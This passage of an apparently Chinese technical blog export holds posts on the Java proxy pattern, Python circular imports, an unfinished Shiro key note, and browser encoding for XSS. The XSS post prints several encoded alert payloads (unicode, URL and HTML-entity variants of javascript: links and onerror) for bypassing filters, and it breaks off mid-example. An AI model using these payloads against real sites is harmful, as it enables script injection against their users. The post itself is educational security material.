<h3 id="代理模式的作用"><a href="#代理模式的作用" class="headerlink" title="代理模式的作用"></a>代理模式的作用</h3><p>1、功能增强 ：在原有功能上增加新功能</p>
<p>2、控制访问  :  控制你直接访问目标</p>
<h3 id="如何实现代理"><a href="#如何实现代理" class="headerlink" title="如何实现代理"></a>如何实现代理</h3><h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><p>1、代理类手动实现</p>
<p>2、代理的目标类是确定的</p>
<h5 id="实现一个静态代理"><a href="#实现一个静态代理" class="headerlink" title="实现一个静态代理"></a>实现一个静态代理</h5><p>1、创建一个接口，定义卖U盘的方法</p>
<p>2、创建厂家类，实现1步骤接口</p>
<p>3、创建商家，就是代理实现1步骤接口</p>
<p>4、定义客户类</p>
<p>定义UsbSell接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//厂家和商家都要完成的功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UsbSell</span>&#123;</span><br><span class="line">  <span class="comment">//购买的数量，返回u盘价格</span></span><br><span class="line">  <span class="type">float</span> <span class="title function_">sell</span><span class="params">(<span class="type">int</span> amount)</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>金士顿厂家</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsbKingFactory</span> <span class="keyword">implements</span> <span class="title class_">UsbSell</span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">float</span> <span class="title function_">sell</span><span class="params">(<span class="type">int</span> amount)</span>&#123;</span><br><span class="line">    <span class="comment">//一个U盘85 10000起卖</span></span><br><span class="line">    <span class="keyword">if</span> (amount &lt; <span class="number">10000</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> flase</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">85.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>淘宝商家</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TaoBao</span> <span class="keyword">implements</span> <span class="title class_">UsbSell</span>&#123;</span><br><span class="line">  <span class="keyword">private</span>  <span class="type">UsbKingFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsbKingFactory</span>();</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">float</span> <span class="title function_">sell</span><span class="params">(<span class="type">int</span> amount)</span>&#123;</span><br><span class="line">   	<span class="comment">//一个我就卖赚25，增强功能，而且我还可以增强各种功能，比如我换包装，我捆绑销售。我好评返现啥的。</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">price</span> <span class="operator">=</span> factory.sell(amount);</span><br><span class="line">    price = price + <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">return</span> price;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShopMain</span>&#123;</span><br><span class="line">  <span class="type">TaoBao</span> <span class="variable">taobao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TaoBao</span>();</span><br><span class="line">  <span class="type">float</span> <span class="variable">price</span> <span class="operator">=</span> taobao.sell(<span class="number">1</span>);</span><br><span class="line">  System.out.println(price);</span><br><span class="line">  <span class="comment">//可以说是被商家剥削了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代理类一般都 会调用目标类的方法，然后额外做其他功能。</p>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><p>1、如果厂家不止一家，就要创建各种厂家类，然后代理商也要调用各种厂家类的方法。所以代理商类也成倍增长。</p>
<p>2、如果接口增减功能，所有实现此接口的所有类都会被影响。</p>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p>在程序执行过程中，使用jdk的反射机制，创建代理类对象，并动态指定代理的目标类。</p>
<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>1、控制访问<br>2、功能增强</p>
<h5 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h5><p>1、JDK动态代理<br>反射包 java.lang.reflect 里面有三个类：InvocationHandler，Method，Proxy</p>
<p>其中 InvocationHandler接口有一个： invoke() 方法，我们需要实现这个接口并在invoke方法中完成下面的功能<br>1、调用目标方法<br>2、功能增强<br>为什么？因为这个 invoke() 会在动态代理对象调用任意方法的时候出发，是动态代理的核心。</p>
<p>怎么用？</p>
<p>1、创建类实现这个接口InvocationHandler？</p>
<p>2、重写invoke方法，把要完成的功能写在里面。</p>
<p>3、生成动态代理对象（生成动态代理对象的过程就是把动态的代码具体到某个类的动态代理对象）</p>
<p>4、执行对应方法。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>1、必须有接口，（比如一个Subject有一个doSomething方法）</p>
<p>2、必须有实现这个接口的类 （比如RealSubject实现这个接口，并且是一个类）</p>
<p>3、设计动态代理类ProxyHandler继承InvocationHandler，在invoke中 通过反射实时调用我们想调用的方法，并做功能增强，最终返回返回值。</p>
<p>4、应用动态代理：声明动态代理的类，生成动态代理对象（new RealSubject，并通过Proxy.newProxyInstance生成动态代理对象。）</p>
<p>特点：</p>
<p>1、无侵入式的代码扩展。</p>
<p>2、无需实现大量的类，可通过反射特性动态执行方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Subject</span>   </span><br><span class="line">&#123;   </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RealSubject</span> <span class="keyword">implements</span> <span class="title class_">Subject</span>   </span><br><span class="line">&#123;   </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>   </span><br><span class="line">  &#123;   </span><br><span class="line">    System.out.println( <span class="string">&quot;call doSomething()&quot;</span> );   </span><br><span class="line">  &#125;   </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>上面两块代码不是确定的，可以实现成千上万的接口和对应类，然后通过动态代理来动态调用和功能增强上面的类的对象。</p>
<p>下面就是动态代理类必须实现InvocationHandler接口，并在invoke中写下面的逻辑代码：1、调用目标对象方法  2、功能增强</p>
<p>（其中bind不是必须的，也可以在别的地方进行动态代理的生成，当然封装成bind函数在生成动态代理的时候更方便。）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span></span><br><span class="line">&#123;</span><br><span class="line">  	<span class="comment">//要执行的目标对象，就是动态代理的目标，动态代理顾名思义这个目标是动态的，是传入的。</span></span><br><span class="line">    <span class="keyword">private</span> Object tar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定委托对象，并返回代理类，相当于生成了一个代理对象。后续就是用这个代理对象进行方法调用的</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">bind</span><span class="params">(Object tar)</span></span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="comment">// 指定动态对象的对应目标，传入参数后，动态代理的对象目标就确定了，不再是模糊的。</span></span><br><span class="line">        <span class="built_in">this</span>.tar = tar;</span><br><span class="line">        <span class="comment">// 绑定该类实现的所有接口，取得动态代理对象，并返回，bind函数本身就是创建动态代理。</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(tar.getClass().getClassLoader(),</span><br><span class="line">                                      tar.getClass().getInterfaces(),</span><br><span class="line">                                      <span class="built_in">this</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">		<span class="comment">//invoke里面主要写两种：1、调用目标对象方法 2、功能增强</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy , Method method , Object[] args)</span><span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//这里就可以进行所谓的AOP编程了</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">//1、根据反射调用对应对象的对应方法，这里就是动态代理能实现的关键。利用的是反射特性，可以动态调用各种对象的各种参数的各种方法</span></span><br><span class="line">        result = method.invoke(tar,args);</span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//2、功能增强</span></span><br><span class="line">      	<span class="comment">//result = chuli(result)</span></span><br><span class="line">        <span class="comment">//在调用具体函数方法后，返回对应结果</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxy</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">    &#123;</span><br><span class="line">           <span class="type">ProxyHandler</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyHandler</span>();</span><br><span class="line">           <span class="comment">//绑定该类实现的所有接口,生成动态代理对象</span></span><br><span class="line">           <span class="type">Subject</span> <span class="variable">sub</span> <span class="operator">=</span> (Subject) proxy.bind(<span class="keyword">new</span> <span class="title class_">RealSubject</span>());</span><br><span class="line">           <span class="comment">//虽然下面调用的是doSomthing，但是实际上是调用的Invoke，同时传入了参数（这里参数为空）</span></span><br><span class="line">      			sub.doSomething();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看完代码，现在我来回答，动态代理的作用是什么：</p>
<ol>
<li>Proxy类的代码量被固定下来，不会因为业务的逐渐庞大而庞大；</li>
<li>可以实现AOP编程，实际上静态代理也可以实现，总的来说，AOP可以算作是代理模式的一个典型应用；</li>
<li><a href="https://www.zhihu.com/search?q=%E8%A7%A3%E8%80%A6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:%2223330381%22%7D">解耦</a>，通过参数就可以判断真实类，不需要事先实例化，更加灵活多变。</li>
</ol>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>python的循环引用问题</title>
    <url>//posts/python_circle_import/</url>
    <content><![CDATA[<h2 id="python的循环引用"><a href="#python的循环引用" class="headerlink" title="python的循环引用"></a>python的循环引用</h2><h3 id="什么是循环引用"><a href="#什么是循环引用" class="headerlink" title="什么是循环引用"></a>什么是循环引用</h3><p>最近写代码遇见了几次python的循环调用问题，主要原因肯定是编码不规范，应该是共同调用的代码抽离出来重新封装，而不是B里面有A需要的代码，同时A里面也有B需要的代码，这样交叉引用python就会报错</p>
<p>当我们import一个python文件时，python会首先去查找这个文件之前是否被import过，如果这个文件之前有被import过，就不会重新再import一次。否则会倒入，并执行一边代码。</p>
<p>python核心编程这本书也说过这个问题:</p>
<blockquote>
<p>加载模块会导致这个模块被执行。也就是被执行模块的顶层代码将直接被执行。这通常包含设定全局变量以及类和函数的声明。一个模块只被加载一次，无论它被导入多少次。这可以阻止多重导入时代码被多次执行</p>
</blockquote>
<span id="more"></span>

<h3 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h3><p>1、最好的解决方案当然是抽离出来公用函数，重新封装。防止循环引用</p>
<p>2、 解决方案1<br>   from common.xx import GetR****<br>   修改为：from common.xx import *</p>
<p>3、解决方案2<br>   把import放在函数里面 需要用到的时候在import<br>   这个仅是权宜之计。</p>
<p>4、解决方案3<br>   直接倒入模块名，需要的函数由模块名调用<br>   import</p>
<p>5、解决方案4<br>     使用TYPE_CHECKING</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> TYPE_CHECKING:</span><br><span class="line">   	<span class="keyword">from</span> models <span class="keyword">import</span> a</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://adamj.eu/tech/2021/05/13/python-type-hints-how-to-fix-circular-imports/">https://adamj.eu/tech/2021/05/13/python-type-hints-how-to-fix-circular-imports/</a></li>
<li><a href="https://www.zhihu.com/question/19887316">https://www.zhihu.com/question/19887316</a></li>
</ul>
]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro漏洞的密钥误判断问题</title>
    <url>//posts/shiro%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AF%86%E9%92%A5%E8%AF%AF%E5%88%A4%E6%96%AD%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在好几次HW中发现现有的几个扫描shiro key的漏洞经常会爆出密钥，但是又无法利用，刚开始的时候以为是利用链的问题，后来发现有时候同样的站，跑不同的几次有时候能扫描出来密钥，有时候则不行。后来分析了这个工具发现密钥误报和利用链有关。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在shiro反序列化漏洞刚出来的那段时间，网上的大部分工具都是通过URLDNS这条链条来验证的，这个验证有点是比较准确，缺点就是在很多不出网的内网机器中容易漏扫。后来牛逼的大佬发现了SimplePrincipalCollection这个类，</p>
<p><strong>暂未写完，有空再来填坑</strong></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>xss之浏览器的编码与解码</title>
    <url>//posts/xss%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="xss之浏览器的编码和解码"><a href="#xss之浏览器的编码和解码" class="headerlink" title="xss之浏览器的编码和解码"></a>xss之浏览器的编码和解码</h1><p>在做一些xss的过滤和绕过时，总是使用各种编码绕过，有时候是unicode，有时候是urlencode，有时候是HTML实体化编码，但是很多时候都是直接fuzz，对于存在xss的漏洞点，并没有清楚的分析和认识，对于浏览器的编码和解码没有系统的认识，这会导致我们的payload理解不到位，从而错失很多个src中的xss漏洞。为了以后能更好的挖掘xss漏洞和更快的fuzz出过waf手法。今天就来详细梳理下浏览器的编码和解码过程。</p>
<span id="more"></span>

<h2 id="浏览器工作过程"><a href="#浏览器工作过程" class="headerlink" title="浏览器工作过程"></a>浏览器工作过程</h2><p>我们都知道网上有很多人写了一个”url点击后电脑都做了什么”，如果感兴趣可以去看看。这里不在赘述请求服务端的流程，这里主要梳理的是一个页面响应后浏览器是如何渲染给我们看的。</p>
<p>浏览器是可以解析html、svg、xhtml的，我们日常使用的网页也基本都是这三种格式，浏览器首先将响应的HTML类文本解析为DOM树。当然CSS解析也会解析为CSS的TREE，但是这里不讨论CSS。我们下面都以HTML举例</p>
<p>浏览器通过解析HTML为DOM 树并通过开始标签、结束标签和标签的属性、方法等根据算法进行解析的。所以浏览器首先是解析HTML，然后根据标签构建DOM树，此时浏览器是没办法识别实体编码的那些内容的，构建完dom树后，浏览器才会对标签里的内容进行解析，然后遇到实体编码的话会解码。所以实体化编码的标签是不会构建为节点的（所以实体化编码很多时候都有用)。</p>
<p>浏览器通过上述的步骤来解析各个标签，最终结合javascript的引擎和CSS的引擎完成对整个页面的操作和渲染。</p>
<h2 id="浏览器的解码顺序"><a href="#浏览器的解码顺序" class="headerlink" title="浏览器的解码顺序"></a>浏览器的解码顺序</h2><p>页面响应后浏览器拿到了HTML的页面文本，浏览器首先根据节点构建DOM树，构建的时候是不会进行解码的，所以如果你输入一个</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>&amp;#<span class="attr">x3d</span>;&quot;<span class="attr">http:</span>//<span class="attr">xxx.com</span>/<span class="attr">1.jpg</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>即使<a href="http://xxx.com/1.jpg%E7%9C%9F%E7%9A%84%E6%98%AF%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%88%B0%EF%BC%8C%E8%BF%99%E4%B8%AAimg%E6%A0%87%E7%AD%BE%E4%B9%9F%E6%98%AF%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9E%84%E5%BB%BA%E7%9A%84%E6%97%B6%E5%80%99%E6%B2%A1%E6%9C%89%E8%A7%A3%E7%A0%81%EF%BC%8Csrc%E4%B8%8D%E4%BC%9A%E8%A2%AB%E8%AE%A4%E4%B8%BA%E6%98%AF%E4%B8%80%E4%B8%AA%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%B2%A1%E6%9C%89%E4%BA%86%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E3%80%82">http://xxx.com/1.jpg真的是一张图片也可以访问到，这个img标签也是显示不出来的，因为构建的时候没有解码，src不会被认为是一个链接，也就没有了这个属性。</a></p>
<p>javascript在html解析中也存在一定的作用，会参与其dom树的构建。所以这并不是线性顺序的。比如dom型xss，但是大方向上，解析还是先html的解析。</p>
<p>DOM节点建立起来以后就要进行解析了，比如他遇到script标签就需要JavaScript来解析，当遇到style就给css的解析器。src、href这种链接形式的会调用URL解码、同时对于一些伪协议，也会调用相应的解析器。</p>
<p>比如下面这个例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%61%6c%65%72%74&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个例子是可以弹窗的，因为dom树构建后，解析过程中发现href为一个链接，会进行urldecode，然后因为javascript伪协议，会交给javascript来解析，最终造成代码执行。</p>
<p>当然javascript本身就支持unicode,所以下面这样也是可以弹窗的：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5c%75%30%30%36%31%6c%65%72%74(123);&quot;</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 需要注意的是括号、引号 不能被unicode替代，否则js不会认为这是需要解码的方法或者字段，只会被当作字符串。 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面我们用两张图来看下浏览器工作和解码的流程：</p>
<p>图一DOM树：</p>
<p>![image-20221026102503733](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20221026102503733.png)</p>
<p>图二构建流程：</p>
<p>![image-20221026102859384](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20221026102859384.png)</p>
<p>如上面两个图所示，HTML解析构建DOM-&gt;script参与构建DOM-&gt;DOM TREE构建完后会进行HTML解码-&gt;rendering渲染（如果中间遇到URL会进行URLDECODE）</p>
<p>既然了解了解析的流程，那么我们也得了解下可以自解码的编码有哪些？</p>
<p>HTML有两种编码方式：进制编码和实体编码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span></span><br><span class="line">&amp;#60</span><br><span class="line">&amp;#x61</span><br></pre></td></tr></table></figure>

<p>JavaScript自解码有三种：Unicode，十进制，十六进制</p>
<p>注意：在js中，单引号，双引号和圆括号等属于控制字符，编码后将无法识别，所以下面这种无法执行：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 不可以执行</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</span>&gt;</span></span><br><span class="line">#可以执行</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074(</span>&#x27;\<span class="attr">u0031</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<p>URL只有一种编码方式就是URL，这个很好理解。</p>
<h2 id="在实践中理解"><a href="#在实践中理解" class="headerlink" title="在实践中理解"></a>在实践中理解</h2><p>下面是一个常用的xss payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(123)&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为javascript解析器可以解析unicode，所以我们可以变种：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(123)&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为href是一个链接所以肯定会被URL解码，所以我们可以变种</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34%28%31%32%33%29&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>现在因为构建DOM树的时候会对HTML进行自解码，所以我们可以变种</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x006a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0076;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0069;</span><span class="symbol">&amp;#x0070;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x003a;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0036;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0035;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0030;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0037;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0034;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0038;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0031;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0033;</span><span class="symbol">&amp;#x0025;</span><span class="symbol">&amp;#x0032;</span><span class="symbol">&amp;#x0039;</span>&quot;</span>&gt;</span>3333<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>现在我们对于这种浏览器的编码有个基本的认识了，但是前面说到这个javascript可以操纵dom，进行动态生成节点，也是产生domxss的重要原因，下面这个解码就比较复杂了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://baidu.com&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;input value=&quot;修改URL&quot; id=&quot;b&quot;&gt; --&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;确定&quot;</span> <span class="attr">onclick</span>=<span class="string">modify_src()</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">modify_src</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title 